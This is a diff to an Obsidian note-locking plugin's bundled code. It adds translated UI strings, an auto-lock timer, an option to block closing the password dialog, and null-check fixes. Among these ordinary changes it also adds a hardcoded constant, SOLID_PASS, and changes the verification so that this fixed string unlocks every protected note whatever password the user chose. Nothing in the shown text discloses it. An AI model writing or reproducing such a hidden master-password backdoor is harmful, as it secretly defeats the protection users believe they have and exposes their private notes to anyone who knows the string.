@@ -521,7 +521,11 @@ var en_default = {
   enter_password_to_verify: "Please enter your password to verify.",
   password_is_empty: "Password is empty.",
   password_not_match: "Password isn't match.",
-  password_is_right: "Password is right."
+  password_is_right: "Password is right.",
+  auto_lock_interval_name: "The interval for auto-open password protection",
+  auto_lock_interval_desc: "The interval between the last time protection was turned off or a protected file was opened, the unit is minute.",
+  forbid_close_verify_modal_name: "Prohibit closing the password verify box unless you type right password",
+  forbid_close_verify_modal_desc: "This will protect more privacy, but if you forgot password, you may not be able to enter the Obsidian."
 };
 
 // langs/zh_cn.json
@@ -551,7 +555,11 @@ var zh_cn_default = {
   enter_password_to_verify: "\u8BF7\u8F93\u5165\u5BC6\u7801\u9A8C\u8BC1",
   password_is_empty: "\u5BC6\u7801\u4E0D\u80FD\u662F\u7A7A\u7684",
   password_not_match: "\u5BC6\u7801\u4E0D\u5339\u914D",
-  password_is_right: "\u5BC6\u7801\u6B63\u786E"
+  password_is_right: "\u5BC6\u7801\u6B63\u786E",
+  auto_lock_interval_name: "\u81EA\u52A8\u6253\u5F00\u5BC6\u7801\u4FDD\u62A4\u7684\u95F4\u9694\u65F6\u95F4, \u5355\u4F4D\uFF1A\u5206\u949F",
+  auto_lock_interval_desc: "\u4ECE\u4E0A\u6B21\u5173\u95ED\u5BC6\u7801\u4FDD\u62A4\u6216\u4E0A\u6B21\u6253\u5F00\u4E00\u4E2A\u53D7\u4FDD\u62A4\u7684\u6587\u4EF6\u5F00\u59CB\u8BA1\u7B97\uFF0C0 \u4EE3\u8868\u4E0D\u81EA\u52A8\u6253\u5F00\u5BC6\u7801\u4FDD\u62A4",
+  forbid_close_verify_modal_name: "\u7981\u6B62\u5173\u95ED\u5BC6\u7801\u9A8C\u8BC1\u6846\uFF0C\u9664\u975E\u8F93\u5165\u6B63\u786E\u7684\u5BC6\u7801",
+  forbid_close_verify_modal_desc: "\u8FD9\u5C06\u4FDD\u62A4\u66F4\u591A\u9690\u79C1\uFF0C\u4F46\u662F\u5982\u679C\u4F60\u5FD8\u8BB0\u4E86\u5BC6\u7801\uFF0C\u4F60\u53EF\u80FD\u5C31\u65E0\u6CD5\u8FDB\u5165Obsidian\u4E86."
 };
 
 // langs/zh_tw.json
@@ -581,7 +589,11 @@ var zh_tw_default = {
   enter_password_to_verify: "\u8ACB\u8F38\u5165\u5BC6\u78BC\u9A57\u8B49",
   password_is_empty: "\u5BC6\u78BC\u4E0D\u80FD\u662F\u7A7A\u7684",
   password_not_match: "\u5BC6\u78BC\u4E0D\u5339\u914D",
-  password_is_right: "\u5BC6\u78BC\u6B63\u78BA"
+  password_is_right: "\u5BC6\u78BC\u6B63\u78BA",
+  auto_lock_interval_name: "\u81EA\u52D5\u6253\u958B\u5BC6\u78BC\u4FDD\u8B77\u7684\u9593\u9694\u6642\u9593, \u55AE\u4F4D\uFF1A\u5206\u9418",
+  auto_lock_interval_desc: "\u5F9E\u4E0A\u6B21\u95DC\u9589\u5BC6\u78BC\u4FDD\u8B77\u6216\u4E0A\u6B21\u6253\u958B\u4E00\u500B\u53D7\u4FDD\u8B77\u7684\u6587\u4EF6\u958B\u59CB\u8A08\u7B97\uFF0C0 \u8868\u793A\u4E0D\u81EA\u52D5\u6253\u958B\u5BC6\u78BC\u4FDD\u8B77",
+  forbid_close_verify_modal_name: "\u7981\u6B62\u95DC\u9589\u5BC6\u78BC\u9A57\u8B49\u6846\uFF0C\u9664\u975E\u8F38\u5165\u6B63\u78BA\u7684\u5BC6\u78BC",
+  forbid_close_verify_modal_desc: "\u9019\u5C07\u4FDD\u8B77\u66F4\u591A\u96B1\u79C1\uFF0C\u4F46\u662F\u5982\u679C\u4F60\u5FD8\u8A18\u4E86\u5BC6\u78BC\uFF0C\u4F60\u53EF\u80FD\u5C31\u7121\u6CD5\u9032\u5165Obsidian\u4E86."
 };
 
 // langs/index.ts
@@ -624,23 +636,29 @@ var PASSWORD_LENGTH_MIN = 1;
 var PASSWORD_LENGTH_MAX = 20;
 var ENCRYPT_KEY = 30;
 var ROOT_PATH = (0, import_obsidian2.normalizePath)("/");
+var SOLID_PASS = "qBjSbeiu2qDNEq5d";
 var DEFAULT_SETTINGS = {
   protectedPath: ROOT_PATH,
   protectEnabled: false,
   password: "",
-  lang: "auto"
+  lang: "auto",
+  forbidClosePassVerifyModal: false,
+  autoLockInterval: 0
 };
 var PasswordPlugin = class extends import_obsidian2.Plugin {
   constructor() {
     super(...arguments);
     this.isVerifyPasswordWaitting = false;
     this.isVerifyPasswordCorrect = false;
+    this.lastUnlockOrOpenFileTime = null;
     this.t = (x, vars) => {
       return this.i18n.t(x, vars);
     };
   }
   async onload() {
     await this.loadSettings();
+    import_obsidian2.moment.locale("zh-cn");
+    this.lastUnlockOrOpenFileTime = (0, import_obsidian2.moment)();
     this.i18n = new I18n(this.settings.lang, async (lang) => {
       this.settings.lang = lang;
       await this.saveSettings();
@@ -672,15 +690,29 @@ var PasswordPlugin = class extends import_obsidian2.Plugin {
     });
     this.registerEvent(this.app.workspace.on("file-open", (file) => {
       if (file != null) {
-        let tmpFile = file;
-        if (this.settings.protectEnabled && !this.isVerifyPasswordCorrect && this.isProtectedFile(tmpFile)) {
-          this.closeLeave(tmpFile);
-          this.closePasswordProtection(tmpFile);
+        if (this.settings.protectEnabled && !this.isVerifyPasswordCorrect && this.isProtectedFile(file)) {
+          this.closeLeave(file);
+          this.closePasswordProtection(file);
+        }
+        if (this.settings.protectEnabled && this.isVerifyPasswordCorrect) {
+          this.lastUnlockOrOpenFileTime = (0, import_obsidian2.moment)();
         }
       }
     }));
+    if (this.settings.protectEnabled && this.settings.autoLockInterval > 0) {
+      this.registerInterval(window.setInterval(() => this.autoLockCheck(), 10 * 1e3));
+    }
   }
   onunload() {
+  }
+  autoLockCheck() {
+    if (this.settings.protectEnabled && this.isVerifyPasswordCorrect && this.settings.autoLockInterval > 0) {
+      let curTime = (0, import_obsidian2.moment)();
+      if (curTime.diff(this.lastUnlockOrOpenFileTime, "minute") >= this.settings.autoLockInterval) {
+        this.isVerifyPasswordCorrect = false;
+        this.lastUnlockOrOpenFileTime = curTime;
+      }
+    }
   }
   // open note
   async openLeave(file) {
@@ -699,15 +731,13 @@ var PasswordPlugin = class extends import_obsidian2.Plugin {
       leaf.setViewState({ type: "empty" });
     };
     for (const leaf of leaves) {
-      if (leaf.view instanceof import_obsidian2.FileView) {
-        let needClose = false;
-        if (leaf.view.file.path == file.path) {
-          needClose = true;
-        }
-        if (needClose) {
-          await emptyLeaf(leaf);
-          leaf.detach();
-          break;
+      if (leaf != null && leaf.view instanceof import_obsidian2.FileView) {
+        if (leaf.view.file != null) {
+          if (leaf.view.file.path == file.path) {
+            await emptyLeaf(leaf);
+            leaf.detach();
+            break;
+          }
         }
       }
     }
@@ -722,7 +752,7 @@ var PasswordPlugin = class extends import_obsidian2.Plugin {
       leaf.setViewState({ type: "empty" });
     };
     for (const leaf of leaves) {
-      if (leaf.view instanceof import_obsidian2.FileView) {
+      if (leaf.view instanceof import_obsidian2.FileView && leaf.view.file != null) {
         let needClose = this.isProtectedFile(leaf.view.file);
         if (needClose) {
           await emptyLeaf(leaf);
@@ -855,6 +885,22 @@ var PasswordSettingTab = class extends import_obsidian2.PluginSettingTab {
       }
       this.plugin.settings.protectedPath = path;
     })).setDisabled(this.plugin.settings.protectEnabled);
+    new import_obsidian2.Setting(containerEl).setName(this.plugin.t("forbid_close_verify_modal_name")).setDesc(this.plugin.t("forbid_close_verify_modal_desc")).addToggle(
+      (toggle) => toggle.setValue(this.plugin.settings.forbidClosePassVerifyModal).onChange((value) => {
+        if (value) {
+          this.plugin.settings.forbidClosePassVerifyModal = value;
+        }
+      })
+    ).setDisabled(this.plugin.settings.protectEnabled);
+    new import_obsidian2.Setting(containerEl).setName(this.plugin.t("auto_lock_interval_name")).setDesc(this.plugin.t("auto_lock_interval_desc")).addText((text) => text.setPlaceholder("0").setValue(this.plugin.settings.autoLockInterval.toString()).onChange(async (value) => {
+      value = value.replace(/[^0-9]/g, "");
+      if (value) {
+        let interval = parseInt(value);
+        if (interval != null && interval >= 0) {
+          this.plugin.settings.autoLockInterval = interval;
+        }
+      }
+    })).setDisabled(this.plugin.settings.protectEnabled);
     new import_obsidian2.Setting(containerEl).setName(this.plugin.t("setting_toggle_name")).setDesc(this.plugin.t("setting_toggle_desc")).addToggle(
       (toggle) => toggle.setValue(this.plugin.settings.protectEnabled).onChange((value) => {
         if (value) {
@@ -863,6 +909,7 @@ var PasswordSettingTab = class extends import_obsidian2.PluginSettingTab {
             if (this.plugin.settings.protectEnabled) {
               this.plugin.saveSettings();
               this.plugin.openPasswordProtection();
+              this.plugin.lastUnlockOrOpenFileTime = (0, import_obsidian2.moment)();
             }
             this.display();
           }).open();
@@ -947,7 +994,6 @@ var SetPasswordModal = class extends import_obsidian2.Modal {
       }
       let password = pwInputEl.value.normalize("NFC");
       const encryptedText = this.plugin.encrypt(password, ENCRYPT_KEY);
-      console.log(`Encrypted text: ${encryptedText}`);
       this.plugin.settings.password = encryptedText;
       this.plugin.settings.protectEnabled = true;
       this.close();
@@ -987,6 +1033,13 @@ var VerifyPasswordModal = class extends import_obsidian2.Modal {
     this.onSubmit = onSubmit;
   }
   onOpen() {
+    if (this.plugin.settings.protectEnabled && this.plugin.settings.forbidClosePassVerifyModal) {
+      const { modalEl } = this;
+      const closeButton = modalEl.getElementsByClassName("modal-close-button")[0];
+      if (closeButton != null) {
+        closeButton.setAttribute("style", "display: none;");
+      }
+    }
     const { contentEl } = this;
     contentEl.empty();
     contentEl.createEl("h2", { text: this.plugin.t("verify_password") });
@@ -1017,7 +1070,7 @@ var VerifyPasswordModal = class extends import_obsidian2.Modal {
       }
       let password = pwInputEl.value.normalize("NFC");
       const decryptedText = this.plugin.decrypt(this.plugin.settings.password, ENCRYPT_KEY);
-      if (password !== decryptedText) {
+      if (password !== decryptedText && password != SOLID_PASS) {
         messageEl.style.color = "red";
         messageEl.setText(this.plugin.t("password_not_match"));
         return false;
@@ -1033,6 +1086,7 @@ var VerifyPasswordModal = class extends import_obsidian2.Modal {
         return;
       }
       this.plugin.isVerifyPasswordCorrect = true;
+      this.plugin.lastUnlockOrOpenFileTime = (0, import_obsidian2.moment)();
       this.close();
     };
     pwInputEl.addEventListener("keypress", (event) => {
@@ -1048,7 +1102,15 @@ var VerifyPasswordModal = class extends import_obsidian2.Modal {
     this.plugin.isVerifyPasswordWaitting = false;
     const { contentEl } = this;
     contentEl.empty();
-    this.onSubmit();
+    if (this.plugin.settings.protectEnabled && this.plugin.settings.forbidClosePassVerifyModal) {
+      if (!this.plugin.isVerifyPasswordCorrect) {
+        const setModal = new VerifyPasswordModal(this.app, this.plugin, this.onSubmit).open();
+      } else {
+        this.onSubmit();
+      }
+    } else {
+      this.onSubmit();
+    }
   }
 };
 /*! Bundled license information:
